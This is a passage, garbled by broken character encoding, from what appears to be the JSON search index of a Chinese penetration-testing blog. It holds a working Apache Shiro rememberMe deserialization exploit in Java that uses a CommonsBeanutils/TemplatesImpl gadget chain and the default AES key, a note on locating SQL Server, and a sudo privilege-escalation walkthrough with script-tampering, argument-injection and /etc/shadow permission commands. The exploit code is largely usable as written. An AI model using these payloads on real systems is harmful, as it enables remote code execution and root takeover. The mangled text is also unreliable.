CBé“¾æ—¶é‡åˆ°çš„é—®é¢˜ä¸è°‹è€Œåˆï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•æ‰¾åˆ°ä¸€ä¸ªæ— ä¾èµ–çš„åˆ©ç”¨é“¾å‘¢\næ— ä¾èµ–é“¾æ„é€  é¦–å…ˆï¼Œæˆ‘ä»¬æ˜ç¡®ç›®æ ‡ï¼Œååºåˆ—åŒ–æ—¶shiroåœ¨å¯»æ‰¾org.apache.commons.collections.comparators.ComparableComparatorï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªèƒ½æ›¿ä»£å®ƒçš„ç±»ï¼Œå…ˆçœ‹çœ‹ComparableComparatoråœ¨å“ªé‡Œè¢«è°ƒç”¨ï¼š\nå‘ç°åœ¨BeanComparatorä¸­è¢«å¼•å…¥ï¼š\nå¹¶ä¸”åœ¨æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥ Comparator çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ComparableComparator\né‚£æˆ‘æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰¾ä¸€ä¸ªèƒ½æ›¿ä»£çš„Comparatorä¼ è¿›å»ï¼Œè¿™ä¸ªComparatoréœ€è¦æ»¡è¶³å‡ ç‚¹è¦æ±‚ï¼š\nå®ç° java.util.Comparator æ¥å£\nå®ç° java.io.Serializable æ¥å£\nJavaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º\næˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªCaseInsensitiveComparatorï¼š\nè¿™ä¸ªç±»æ˜¯ java.lang.String ç±»ä¸‹çš„ä¸€ä¸ªå†…éƒ¨ç§æœ‰ç±»ï¼Œå…¶å®ç°äº†Comparator å’Œ Serializable ï¼Œä¸”ä½äºJavaçš„æ ¸å¿ƒä»£ç ä¸­ï¼Œå…¼å®¹æ€§å¼º\næˆ‘ä»¬å¯ä»¥é€šè¿‡ String.CASE_INSENSITIVE_ORDER å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„ CaseInsensitiveComparator å¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– BeanComparator ï¼š\nBeanComparator bc = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); æœ€ç»ˆçš„ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.*; import java.util.Map; import java.util.PriorityQueue; import java.util.Queue; public class CommonsBeanutilsShiro { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bc = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue pq = new PriorityQueue(2, bc); pq.add(\u0026#34;test\u0026#34;); pq.add(\u0026#34;test\u0026#34;); setFieldValue(bc, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(pq, \u0026#34;queue\u0026#34;,new Object[]{tmpl, tmpl}); byte[] payload = serialize(pq); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payload, key); System.out.printf(\u0026#34;rememberMe=\u0026#34; + ciphertext.toString()); } public static byte[] serialize(Queue queue) throws Exception { ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } å‘é€è¯·æ±‚å³å¯è§¦å‘RCEï¼š è‡³æ­¤æˆ‘ä»¬å®Œæˆäº†ä½¿ç”¨CBåœ¨æ— CCä¾èµ–æ—¶æ‰“ååºåˆ—åŒ–RCEçš„åˆ©ç”¨é“¾æ„é€ \n",
        "summary": "shiroååºåˆ—åŒ–æ¼æ´ shiroæ˜¯ä¸€ä¸ªé€šç”¨çš„é‰´æƒæ¡†æ¶ï¼Œè€Œå®ƒæœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´ï¼šshiroååºåˆ—åŒ–\nç®€å•è®²è®²æ¼æ´åŸç†ï¼šä¸ºäº†è®©æµè§ˆå™¨æˆ–æœåŠ¡å™¨é‡å¯åç”¨æˆ·ä¸ä¸¢å¤±ç™»å½•çŠ¶æ€ï¼ŒShiroæ”¯æŒå°†æŒä¹…åŒ–ä¿¡æ¯åºåˆ—åŒ–å¹¶åŠ å¯†åä¿å­˜åœ¨Cookieçš„rememberMeå­—æ®µä¸­ï¼Œä¸‹æ¬¡è¯»å–æ—¶è¿›è¡Œè§£å¯†å†ååºåˆ—åŒ–ã€‚\nä½†æ˜¯åœ¨Shiro 1.2.4ç‰ˆæœ¬ä¹‹å‰å†…ç½®äº†ä¸€ä¸ªé»˜è®¤ä¸”å›ºå®šçš„AESåŠ å¯†Keyï¼Œè€Œcookieçš„ç”Ÿæˆé€»è¾‘ä¹Ÿå¾ˆæ¸…æ™°ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²+AES åŠ å¯†+base64 åŠ å¯†ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æŒ‰ç…§è¿™ä¸ªé€»è¾‘ä¼ªé€ ä»»æ„çš„rememberMe Cookieï¼Œè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´\næ‰€ä»¥è¿™é‡Œä¸åˆ†æåŸç†äº†ï¼Œæ¥åˆ†æä¸€ä¸‹payloadçš„æ„é€ \nTemplatesImplåœ¨shiroä¸­çš„åˆ©ç”¨ å¦‚æœç»è¿‡å°è¯•çš„è¯ï¼Œä¼šå‘ç°CommonsCollections6æ˜¯æ— æ³•åœ¨shiroä¸­åˆ©ç”¨çš„ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ï¼Œè€ŒCC6ä¸­ç”¨åˆ°äº†transformeræ•°ç»„ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±å°è¯•ç”¨TemplatesImplæ„é€ ä¸€ä¸ªæ— æ•°ç»„çš„payload\nåœ¨åˆ†æCC6å‰æœ‰ä¸€ä¸ªnewTransformerçš„æ–¹æ³•å¦‚ä¸‹ï¼š\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null) }; è¿™é‡Œä½¿ç”¨äº†æ•°ç»„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å…¶ä»–æ–¹æ³•æ›¿ä»£æ‰\nCC6ä¸­ç”¨åˆ°çš„TiedMapEntryç±»æœ‰ä¸€ä¸ªgetValueæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†mapçš„getæ–¹æ³•ï¼Œå¹¶ä¼ å…¥keyï¼š\nè€Œè¿™ä¸ªgetæ–¹æ³•å°±æ˜¯LazyMapçš„è§¦å‘ç‚¹ï¼š\næˆ‘ä»¬æ³¨æ„åˆ°ï¼Œè¿™ä¸ª LazyMap#get çš„å‚æ•°keyï¼Œä¼šè¢«ä¼ è¿›transform()ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨å®ƒæ¥æ›¿ä»£ConstantTransformer()çš„ä½œç”¨ï¼Œè¿™æ ·ä¸€æ¥æ•°ç»„ä¸­åªå‰©ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆè‡ªç„¶å°±ä¸éœ€è¦æ•°ç»„äº†ï¼Œæ¥ä¸‹æ¥å°è¯•æ„é€ payload\næ„é€ ï¼ˆCommonsCollectionsK1ï¼‰ åœ¨CC6çš„åŸºç¡€ä¸Šä¿®æ”¹ï¼ŒåŒæ ·ä½¿ç”¨javassistæ¥ç”Ÿæˆå‘½ä»¤æ‰§è¡Œå¼¹å‡ºè®¡ç®—å™¨çš„å­—èŠ‚ç ï¼Œå¹¶ä¸”åˆ›å»ºInvokerTransformeræ—¶å…ˆä¼ å…¥çš„æ— ç”¨æ–¹æ³•getClassï¼Œç­‰åˆ°åºåˆ—åŒ–æ—¶å†åå°„ä¿®æ”¹ä¸ºnewTransformerï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nbyte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, tmpl); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerMap.clear(); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); è¿™é‡Œè¦æ³¨æ„çš„æ˜¯æœ€ç»ˆçš„payloadçš„åŠ å¯†å’Œç¼–ç æ“ä½œï¼Œä¸ºäº†é¿å…å‡ºé”™å¯ä»¥ç›´æ¥ä½¿ç”¨shiroåº“ä¸­çš„åŠ å¯†å’Œç¼–ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š\n"
    }
,
    {
        "title": "SQL serverææƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/sql-server%E6%8F%90%E6%9D%83/",
        "content": "SQL serverææƒ SQL serverï¼Œå³mssqlï¼Œæ˜¯å¾®è½¯å¼€å‘çš„ä¸€æ¬¾å…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿï¼Œå¸¸å‡ºç°åœ¨windowsä¸»æœºä¸Šï¼Œè€ŒSQL serverå…·æœ‰ä¸€äº›å¸¸è§„çš„æ‰“æ³•ï¼ˆä¸»è¦æ˜¯ç”¨äºææƒï¼‰ï¼Œè¿™é‡Œå­¦ä¹ å¹¶è®°å½•\nå‘ç°SQL server æœ¬åœ°æŸ¥çœ‹ SQL serveré»˜è®¤1433ç«¯å£ï¼Œæ‰€ä»¥å¦‚æœåœ¨getshellåå‘ç°1433ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ï¼Œåˆ™æœ‰å¯èƒ½å®‰è£…äº†SQL server\nå¦‚æœç«¯å£è¢«ä¿®æ”¹ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹è¿›ç¨‹IDæ¥æŸ¥æ‰¾SQL serverï¼š\ntasklist /svc | findstr MSSQLSERVER netstat -ano | findstr \u0026lt;è¿›ç¨‹ID\u0026gt; ",
        "summary": "SQL serverææƒ SQL serverï¼Œå³mssqlï¼Œæ˜¯å¾®è½¯å¼€å‘çš„ä¸€æ¬¾å…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿï¼Œå¸¸å‡ºç°åœ¨windowsä¸»æœºä¸Šï¼Œè€ŒSQL serverå…·æœ‰ä¸€äº›å¸¸è§„çš„æ‰“æ³•ï¼ˆä¸»è¦æ˜¯ç”¨äºææƒï¼‰ï¼Œè¿™é‡Œå­¦ä¹ å¹¶è®°å½•\nå‘ç°SQL server æœ¬åœ°æŸ¥çœ‹ SQL serveré»˜è®¤1433ç«¯å£ï¼Œæ‰€ä»¥å¦‚æœåœ¨getshellåå‘ç°1433ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ï¼Œåˆ™æœ‰å¯èƒ½å®‰è£…äº†SQL server\nå¦‚æœç«¯å£è¢«ä¿®æ”¹ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹è¿›ç¨‹IDæ¥æŸ¥æ‰¾SQL serverï¼š\ntasklist /svc | findstr MSSQLSERVER netstat -ano | findstr \u0026lt;è¿›ç¨‹ID\u0026gt; "
    }
,
    {
        "title": "sudoç›¸å…³ææƒæ€è·¯",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/sudo%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/",
        "content": "sudoç›¸å…³ææƒæ€è·¯ sudoï¼ˆsuper user doï¼‰æ˜¯linuxç³»ç»Ÿä¸­ç”¨äºç®¡ç†ç”¨æˆ·æƒé™çš„å·¥å…·ï¼Œå…è®¸æ™®é€šç”¨æˆ·åœ¨æ— éœ€åˆ‡æ¢åˆ°è¶…çº§ç”¨æˆ·çš„æƒ…å†µä¸‹ä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸ï¼Œåœ¨ä½¿ç”¨sudoå‘½ä»¤æ—¶ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥è‡ªå·±çš„å¯†ç éªŒè¯è‡ªå·±æ˜¯å¦æœ‰æƒé™ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰æƒé™ï¼Œä¼šå‘ŠçŸ¥ç”¨æˆ·ï¼šè¯¥ç”¨æˆ·ä¸åœ¨sudoersæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªäº‹ä»¶å°†ä¼šè¢«æŠ¥å‘Š\nå¦‚æœsudoé…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´å®‰å…¨éšæ‚£\nä¸€ã€sudoæƒé™åˆ†é…ä¸å½“ å½“é…ç½®æ™®é€šç”¨æˆ·sudoæƒé™æ—¶ï¼Œè®¾ç½®äº†å…å¯†çš„sudoç”¨æˆ·ï¼Œå³è¯¥ç”¨æˆ·ä¸éœ€è¦è¾“å…¥å£ä»¤å³å¯æ‰§è¡Œç‰¹æƒå‘½ä»¤\næˆ‘ä»¬é€šå¸¸ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰sudoæƒé™ï¼š\nsudo -l è€Œæœ‰ä¸€éƒ¨åˆ†å‘½ä»¤å¦‚æœèƒ½å…å¯†æ‰§è¡Œï¼Œåˆ™å¯ä»¥è¿›è¡Œæƒé™æå‡çš„åˆ©ç”¨ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„sudoææƒ\nsudoçš„åŸºæœ¬åˆ©ç”¨æ€è·¯æœ‰å¦‚ä¸‹å‡ ç§ï¼š\nå…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œé‡æ–°è·å–ä¸€ä¸ªrootèº«ä»½çš„shell æŸäº›å·¥å…·å…è®¸å…å¯†sudoè¿è¡Œï¼Œä¸”èƒ½å¤Ÿè¿è¡Œè„šæœ¬/é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä¿®æ”¹è„šæœ¬/é…ç½®æ–‡ä»¶å®ç°è·å–ä¸€ä¸ªrootèº«ä»½çš„shell å…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œè·å–/etc/shadowç¬¬ä¸€è¡Œrootçš„å¯†ç å“ˆå¸Œï¼Œå†è¿›è¡Œçˆ†ç ´è·å–æ˜æ–‡å¯†ç  å…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œç”¨æ–°çš„rootå¯†ç å“ˆå¸Œè¦†ç›–æ‰åŸæœ¬çš„/etc/shadow ï¼ˆæ€è·¯é€‰æ‹©çš„æ¨èåº¦æŒ‰åºé™ä½ï¼Œè¶Šé åçš„æ€è·¯ï¼Œå¯¹ä¸»æœºé€ æˆçš„å½±å“è¶Šå¤§ï¼‰\nç”±äºèƒ½åˆ©ç”¨çš„åœºæ™¯å¤ªå¤šï¼Œè¿™é‡Œä¸ä½œèµ˜è¿°ï¼Œåˆ©ç”¨å‘½ä»¤å‡å¯åœ¨è¿™ä¸ªç½‘ç«™ä¸ŠæŸ¥è¯¢ï¼šGTFOBins\nå¯ä»¥å‚è€ƒæ–‡ç« å­¦ä¹ ï¼šLinuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•\näºŒã€sudoè„šæœ¬ç¯¡æ”¹ææƒ å¦ä¸€ç§æƒ…å†µï¼Œç®¡ç†å‘˜å¯èƒ½ä¼šå°†æŸä¸ªshellè„šæœ¬è®¾ç½®ä¸ºsudoå…å¯†æ‰§è¡Œï¼Œå¦‚æœä½æƒé™ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶å¯å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†ææƒä»£ç å†™å…¥è¯¥æ–‡ä»¶ï¼Œå®ç°æƒé™æå‡ã€‚æˆ‘ä»¬é…ç½®å¦‚ä¸‹åœºæ™¯ï¼ˆå®éªŒç¯å¢ƒä¸ºcentos 7ï¼‰ï¼š\né¦–å…ˆä»¥rootèº«ä»½é…ç½®ï¼š\ngroupadd yuy0ung # åˆ›å»ºä¸€ä¸ªåä¸º yuy0ung çš„æ–°ç»„ useradd -d /home/yuy0ung -m yuy0ung -g yuy0ung -s /bin/bash -p 123456 # æ·»åŠ ç”¨æˆ· yuy0ungï¼ŒæŒ‡å®šä¸»ç›®å½•ä¸º /home/yuy0ungï¼Œè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼›è®¾ç½®é»˜è®¤ shell ä¸º /bin/bashï¼›è®¾ç½®ç»„ä¸º yuy0ungï¼›è®¾å®šå¯†ç ä¸º 123456 mkdir -p ~yuy0ung/demo # åˆ›å»ºç›®å½• /home/yuy0ung/demoï¼Œè‹¥ä¸Šçº§ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¸€å¹¶åˆ›å»º chown yuy0ung:yuy0ung ~yuy0ung/demo # å°†ç›®å½• /home/yuy0ung/demo çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„æ›´æ”¹ä¸º yuy0ung chmod a+x ~yuy0ung/demo # ä¸ºæ‰€æœ‰ç”¨æˆ·å¢åŠ  /home/yuy0ung/demo ç›®å½•çš„æ‰§è¡Œæƒé™ echo \u0026#34;yuy0ung ALL=(root) NOPASSWD:/home/yuy0ung/demo/shell.sh\u0026#34; \u0026gt;\u0026gt; /etc/sudoers # å…è®¸ yuy0ung ç”¨æˆ·åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ä»¥ root èº«ä»½æ‰§è¡Œ /home/yuy0ung/demo/shell.sh è„šæœ¬ï¼Œå°†æ­¤é…ç½®è¿½åŠ åˆ° /etc/sudoers æ–‡ä»¶ä¸­ ç„¶ååˆ‡æ¢åˆ°yuy0ungï¼š\nsu yuy0ung # åˆ›å»ºä¸€ä¸ªæ–°çš„shellè„šæœ¬æ–‡ä»¶ï¼Œå¹¶æ·»åŠ shebangè¡Œï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶å°†ä½¿ç”¨bashæ¥è§£é‡Š echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt;\u0026gt; /home/yuy0ung/demo/shell.sh # åœ¨åˆšæ‰åˆ›å»ºçš„shellè„šæœ¬æ–‡ä»¶ä¸­æ·»åŠ ä¸€è¡Œå‘½ä»¤ï¼Œç”¨äºæ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯ echo \u0026#34;ps aux\u0026#34; \u0026gt;\u0026gt; /home/yuy0ung/demo/shell.sh # ä¿®æ”¹è„šæœ¬æ–‡ä»¶çš„æƒé™ï¼Œä½¿å…¶å…·æœ‰å¯æ‰§è¡Œæƒé™ chmod +x /home/yuy0ung/demo/shell.sh æ¥ä¸‹æ¥è¿›å…¥åœºæ™¯ï¼šæˆ‘ä»¬ç°åœ¨åˆšè·å–è¿™ä¸ªyuy0ungèº«ä»½çš„shellï¼Œå‡†å¤‡å°è¯•æƒé™æå‡\né¦–å…ˆæŸ¥çœ‹sudoæƒé™ï¼š\nsudo -l æˆ‘ä»¬å‘ç°/home/yuy0ung/demo/shell.shå¯ä»¥å…å¯†æ‰§è¡Œsudo\nå†æŸ¥çœ‹è¯¥è„šæœ¬æ‰€åœ¨ç›®å½•çš„æƒé™ï¼š\nls -al /home/yuy0ung/demo/ æˆ‘ä»¬æ‹¥æœ‰è¯¥æ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒé™ï¼Œåˆ™å¯ä»¥å‘/home/yuy0ung/demo/shell.shä¸­å¤¹å¸¦ç‚¹ç§è´§ï¼š\necho d2hvYW1pCnN1IC0K |base64 -d \u0026gt;\u0026gt; /home/yuy0ung/demo/shell.sh # åœ¨shell.shç»“å°¾æ·»åŠ äº†ä¸¤è¡Œå‘½ä»¤ï¼šwhoamiå’Œsu - çœ‹çœ‹è„šæœ¬çš„æƒé™ï¼Œå¦‚æœæ²¡æœ‰æ‰§è¡Œæƒé™è®°å¾—æ·»åŠ ï¼š\nls -al /home/yuy0ung/demo/shell.sh #å¦‚æœæ²¡æœ‰æ‰§è¡Œæƒé™ chmod +x /home/yuy0ung/demo/shell.sh æ²¡æœ‰é—®é¢˜äº†ï¼Œå…å¯†sudoæ‰§è¡Œè„šæœ¬ï¼š\nsudo /home/yuy0ung/demo/shell.sh ææƒæˆåŠŸ\nä¸‰ã€sudoè„šæœ¬å‚æ•°ææƒ å½“æˆ‘ä»¬å‘ç°äº†æœ‰sudoæƒé™çš„è„šæœ¬ï¼Œä½†æˆ‘ä»¬å¹¶æ²¡æœ‰ä¿®æ”¹æƒé™çš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•é˜…è¯»è„šæœ¬ä»£ç ï¼Œåˆ¤æ–­è„šæœ¬æ˜¯å¦å…è®¸å¸¦å‚æ•°æ‰§è¡Œï¼Œå¦‚æœè„šæœ¬å…è®¸å¸¦å‚æ•°æ‰§è¡Œå¹¶ä¸”å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥ç¼ºé™·æ¥è¿›è¡Œæƒé™æå‡\næˆ‘ä»¬å¯ä»¥é…ç½®å¦‚ä¸‹åœºæ™¯ï¼ˆCentOS 7ï¼‰ï¼Œä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ï¼š\necho IyEvYmluL2Jhc2gKJHsxfS9sb2cuc2g= |base64 -d \u0026gt; /var/www/log.sh # å†™å…¥è„šæœ¬å†…å®¹var chown root:root /var/www/log.sh # å°†ç›®å½• /var/www/log.sh çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„æ›´æ”¹ä¸º yuy0ung chmod a+x /var/www/log.sh # ä¸ºæ‰€æœ‰ç”¨æˆ·å¢åŠ  /var/www/log.sh ç›®å½•çš„æ‰§è¡Œæƒé™ echo \u0026#34;yuy0ung ALL=(root) NOPASSWD:/var/www/log.sh\u0026#34; \u0026gt;\u0026gt; /etc/sudoers # å…è®¸ yuy0ung ç”¨æˆ·åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ä»¥ root èº«ä»½æ‰§è¡Œ /var/www/log.sh è„šæœ¬ï¼Œå°†æ­¤é…ç½®è¿½åŠ åˆ° /etc/sudoers æ–‡ä»¶ä¸­ chmod 755 /var/www/log.sh # ä¿®æ”¹/var/www/log.shçš„æƒé™ï¼Œå…è®¸ç”¨æˆ·yuy0ungæ‰§è¡Œ åˆ‡æ¢ç”¨æˆ·åˆ°yuy0ungï¼Œæ¥ä¸‹æ¥è¿›å…¥åœºæ™¯ï¼šæˆ‘ä»¬ç°åœ¨åˆšè·å–è¿™ä¸ªyuy0ungèº«ä»½çš„shellï¼Œå‡†å¤‡å°è¯•æƒé™æå‡\nè€è§„çŸ©ï¼Œå…ˆæŸ¥çœ‹sudoé…ç½®ï¼š\nsudo -l æˆ‘ä»¬å‘ç°/var/www/log.shå…·æœ‰å…å¯†sudoæƒé™\næŸ¥çœ‹è¯¥ç›®å½•ä¸‹æ–‡ä»¶æƒé™ï¼š\nls -al /var/www/ ge-20240718002341693](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718002342169-1658163908.png)\næˆ‘ä»¬å‘ç°yuy0ungå¯¹è¯¥æ–‡ä»¶åªæœ‰å¯è¯»å¯æ‰§è¡Œæƒé™ï¼Œæ²¡æœ‰å¯å†™æƒé™ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œsudoè„šæœ¬ç¯¡æ”¹ææƒã€‚\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬å†…å®¹ï¼š\ncat /var/www/log.sh å¯è§è„šæœ¬å†…å®¹ä¸ºï¼š\n#!/bin/bash ${1}/log.sh è¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œè„šæœ¬ä¸­çš„å‚æ•°${1}æ˜¯å¯æ§çš„ï¼Œè¿è¡Œè„šæœ¬æ—¶ï¼Œè¾“å…¥çš„ç¬¬ä¸€æ®µå­—ç¬¦ä¸²ä¼šèµ‹å€¼ç»™è¯¥å‚æ•°ï¼Œå¹¶æ‰§è¡Œå¯¹åº”ç›®å½•çš„log.shè„šæœ¬æ–‡ä»¶\nå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸ªæˆ‘ä»¬å¯å†™çš„ç›®å½•ï¼Œåœ¨å…¶ä¸­å†™å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„log.shï¼Œå†æ§åˆ¶/var/www/log.shå»æ‰§è¡Œå¦ä¸€ä¸ªlog.shï¼Œå³å¯å®ç°æƒé™æå‡\næ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåœ¨/tmp/ç›®å½•å†™å…¥ä¸€ä¸ªç”¨äºæƒé™æå‡ï¼ˆå†…å®¹ä¸ºæ‰“å¼€ä¸€ä¸ªBashShellï¼‰çš„log.shï¼š\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/log.sh èµ‹äºˆè¯¥è„šæœ¬æ–‡ä»¶æ‰€æœ‰æƒé™ï¼š\nchmod 777 /tmp/log.sh sudoè¿è¡Œ/var/www/log.shï¼Œé—´æ¥è¿è¡Œ/tmp/log.shï¼š\nsudo /var/www/log.sh \u0026#34;/tmp\u0026#34; æˆåŠŸå®ç°æƒé™æå‡\nè¿™ç§æƒé™æå‡æƒ…å†µæ¯”è¾ƒç‰¹æ®Šï¼Œéœ€è¦æ ¹æ®è„šæœ¬å†…å®¹è¿›è¡Œåº”å˜ï¼Œå¯ä»¥å†çœ‹çœ‹ä¸‹é¢ä¸¤ä¸ªsudoè„šæœ¬è¿›è¡Œç»ƒä¹ ï¼š\nè„šæœ¬1ï¼š\n#!/bin/bash set -x if [ $1 = \u0026#34;aaa\u0026#34; ];then eval $cmd exit $? fi åˆ©ç”¨ï¼š\nsudo /var/www/log.sh aaa \u0026#34;su -\u0026#34; # åˆ©ç”¨è„šæœ¬å…å¯†åˆ‡æ¢è‡³root è„šæœ¬2ï¼š\n#!/bin/bash set -x if [ $1 = \u0026#34;aaa\u0026#34; ];then chown yuy0ung:yuy0ung $2/log.sh fi åˆ©ç”¨ï¼š\nsudo ./2.sh aaa \u0026#34;/etc/shadow \u0026#34; chmod 777 /etc/shadow cat /etc/shadow # åˆ©ç”¨è„šæœ¬è¯»å–shadowæ–‡ä»¶ è„šæœ¬çš„åˆ©ç”¨æ–¹å¼æ˜¯å¤šæ ·çš„ï¼Œè¿™é‡Œä»…ä¾›å‚è€ƒ\nå››ã€sudoç»•è¿‡è·¯å¾„ è‹¥ç®¡ç†å‘˜åœ¨é…ç½®sudoersæ–‡ä»¶æ—¶ä½¿ç”¨äº†é€šé…ç¬¦ï¼Œè¿™ç§æƒ…å†µå¾ˆå¯èƒ½è¢«åˆ©ç”¨æ¥ç»•è¿‡sudoçš„é™åˆ¶\necho \u0026#34;yuy0ung ALL=(root) NOPASSWD:/bin/less /home/yuy0ung/*\u0026#34; \u0026gt;\u0026gt; /etc/sudoers # å…è®¸ yuy0ung ç”¨æˆ·åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ä»¥ root èº«ä»½æ‰§è¡Œ /bin/less /home/yuy0ung/* 